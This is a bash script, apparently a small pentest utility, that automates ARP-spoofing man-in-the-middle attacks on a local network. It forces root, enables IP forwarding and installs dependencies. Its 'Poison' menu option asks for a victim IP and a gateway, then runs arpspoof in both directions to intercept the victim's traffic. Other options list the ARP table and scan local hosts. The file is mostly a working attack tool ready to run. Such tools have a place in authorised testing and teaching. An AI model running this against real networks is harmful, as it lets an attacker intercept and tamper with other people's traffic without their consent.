#!/usr/bin/bash

# Developed by Buccioz

#font
bold=$(tput bold)
normal=$(tput sgr0)

#colors                                                                                        
NC='\033[0m'
Red='\033[0;91m'
Cyan='\033[0;96m'
Green='\033[0;92m'
Purple='\033[0;95m'

#loading animation
spinner() {
	local i sp n
	sp='/-\|'
	n=${#sp}
	printf ' '
	while sleep 0.1; do
		printf "%s\b" "${sp:i++%n:1}"
	done
}

#forcing running as root
root() {	 
	clear
	if [ "$EUID" -ne 0 ]
	then 
		echo -e "${Red}${bold}Not running as root...${NC}${normal}";
		echo "" ;
		sudo "$0" "$@"
		exit
	fi
}

#requirements
requirements() {
	echo -e "${Green}${bold}Checking the requirements...${NC}${normal}";
	spinner&
	sleep 3
	kill "$!"
	clear
	
	echo -e "${Green}${bold}Installing dependencies...${NC}${normal}";
	# Install xterm in the current terminal first so it can be used for the next step
	sudo apt-get update
	sudo apt-get install -y xterm
	
	chmod +x ./requirements.sh
	sudo xterm -e ./requirements.sh

	echo -e "${Green}${bold}Enabling IP Forwarding...${NC}${normal}"; 
	# More robust way to enable IP forwarding
	echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null

	spinner&
	sleep 3
	kill "$!"
}

#Print Net-Stats
netstats() {
	printf "${Purple}"
	echo -e "${bold}----[Net-Stats]----"
	echo
	sudo ip addr | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print iface" : "a[1] }'
	
	# Get only the first default gateway IP
	IP=$(/sbin/ip route | awk '/default/ { print $3 }' | head -n 1)
	echo "Default Gateway : $IP ${normal}"
	echo
}

backmenu() {
	read -r -p 'Press 1 to return to main menu...' responsecl
	case "$responsecl" in 
		([1]) clear; main ;;
		(* )
			echo "Invalid input... returning to main menu"
			sleep 2; clear; main
			;;
	esac
}

main() {
	chmod +x ./banner.sh
	./banner.sh
	netstats

	printf "${Purple}${bold}"
	PS3=': '
	options=("Poison" "Arp Table" "Hosts Scan" "Quit")
	select opt in "${options[@]}"
	do
		case $opt in
			"Poison")
				clear
				./banner.sh
				netstats
				printf "${Purple}${bold}"
				read -p 'Interface (e.g., eth0, wlan0): ' inter
				read -p 'Victim IP: ' vict
				read -p 'Default Gateway: ' gate
				echo
				echo "Poisoning active. Close the new windows to stop."
				
				# Launching both windows in background
				sudo xterm -e arpspoof -i "$inter" -t "$vict" -r "$gate" & 
				sudo xterm -e arpspoof -i "$inter" -t "$gate" -r "$vict" &
				
				wait # Waits for both background processes to be closed
				backmenu
			;;
			"Arp Table")
				clear
				./banner.sh
				netstats
				sudo arp -a 
				backmenu
			;;
			"Hosts Scan")
				clear
				./banner.sh
				netstats
				read -p 'Interface: ' scanint
				sudo arp-scan --interface="$scanint" --localnet
				backmenu
			;;
			"Quit") clear; exit ;;
			*) echo "Invalid option"; sleep 1; clear; main ;;
		esac
	done
}

root
requirements	   
clear
main
